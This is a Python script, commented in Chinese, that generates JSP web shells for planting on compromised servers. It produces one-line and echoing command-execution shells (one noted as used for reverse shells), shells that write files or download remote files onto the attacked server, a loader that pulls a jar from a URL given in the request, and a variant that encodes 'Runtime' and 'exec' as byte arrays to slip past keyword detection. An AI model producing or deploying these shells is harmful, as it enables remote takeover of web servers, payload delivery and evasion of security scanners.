def jsp_base(pwd):
    print('无回显执行系统命令,一般用来反弹shell')
    return '<%Runtime.getRuntime().exec(request.getParameter("'+pwd+'"));%>'

def jsp_base2(pwd):
    print('有回显执行系统命令')
    j='''<%
        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("'''+pwd+'''")).getInputStream();
        int a = -1;
        byte[] b = new byte[2048];
        out.print("<pre>");
        while((a=in.read(b))!=-1){
            out.println(new String(b));
        }
        out.print("</pre>");
%>'''
    return j

def jsp_writefile():
    print('这个马用来写文件到服务器')
    name=input('文件路径的参数名:')
    s=input('内容的参数名:')
    yn=input('使用相对路径(web目录下)(y)?或绝对路径(n)').strip().lower()
    
    if yn=='y':
        p='application.getRealPath("/")+"/"+'
        print('使用:?{}=文件名&{}=内容'.format(name,s))
    else:
        p=''
        print('使用:?{}=绝对路径&{}=内容'.format(name,s))

    m1='<%new java.io.RandomAccessFile({}request.getParameter("{}"),"rw").write(request.getParameter("{}").getBytes()); %>'.format(p,name,s)
    m2='<%new java.io.FileOutputStream({}request.getParameter("{}")).write(request.getParameter("{}").getBytes());%>'.format(p,name,s)
    return m1+'\n'+m2


def jsp_downloadfile():
    print('这个马用来下载远程文件(到被攻击服务器)')
    name=input('文件路径的参数名:')
    u=input('下载地址的参数名:')
    yn=input('使用相对路径(web目录下)(y)?或绝对路径(n)').strip().lower()
    
    if yn=='y':
        p='application.getRealPath("/")+"/"+'
        print('使用:?{}=文件名&{}=下载地址'.format(name,u))
    else:
        p=''
        print('使用:?{}=绝对路径&{}=下载地址'.format(name,u))
    m='''<%
    java.io.InputStream in = new java.net.URL(request.getParameter("'''+u+'''")).openStream();
    byte[] b = new byte[1024];
    java.io.ByteArrayOutputStream baos = new java.io.ByteArrayOutputStream();
    int a = -1;
    while ((a = in.read(b)) != -1) {
        baos.write(b, 0, a);
    }
    new java.io.FileOutputStream('''+p+'''request.getParameter("'''+name+'''")).write(baos.toByteArray());
%>'''
    return m

def jsp_calljar():
    print('这个马用来调用外部的jar')
    u=input('外部地址的参数名:')
    return '<%=Class.forName("Load",true,new java.net.URLClassLoader(new java.net.URL[]{new java.net.URL(request.getParameter("'+u+'"))})).getMethods()[0].invoke(null, new Object[]{request.getParameterMap()})%>'


def jsp_nokw(pwd):
    print('无关键字的执行系统命令')

    a='''<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="1.2">
    <jsp:directive.page contentType="text/html" pageEncoding="UTF-8"/>
    <jsp:scriptlet>
        Class<?> api = String.class.getClass().forName(new String(new byte[]{106, 97, 118, 97, 46, 108, 97, 110, 103, 46, 82, 117, 110, 116, 105, 109, 101}));
        Object obj2 = api.getMethod(new String(new byte[]{101, 120, 101, 99}), String.class).invoke(api.getMethod(new String(new byte[]{103, 101, 116, 82, 117, 110, 116, 105, 109, 101})).invoke(null, new Object[]{}), new Object[]{request.getParameter("'''+pwd+'''")});
        java.lang.reflect.Method m = obj2.getClass().getMethod(new String(new byte[]{103, 101, 116, 73, 110, 112, 117, 116, 83, 116, 114, 101, 97, 109}));
        m.setAccessible(true);
        java.util.Scanner s = new java.util.Scanner((java.io.InputStream) m.invoke(obj2, new Object[]{})).useDelimiter("\\A");
        out.write("<pre>" + (s.hasNext() ? s.next() : "") + "</pre>");
    </jsp:scriptlet>
</jsp:root>'''
    return a

if __name__ == "__main__":

    #print(jsp_base('c'))
    #print(jsp_base2('c'))
    #print(jsp_calljar())
    print(jsp_downloadfile())
    print(jsp_nokw('c'))
    print(jsp_writefile())
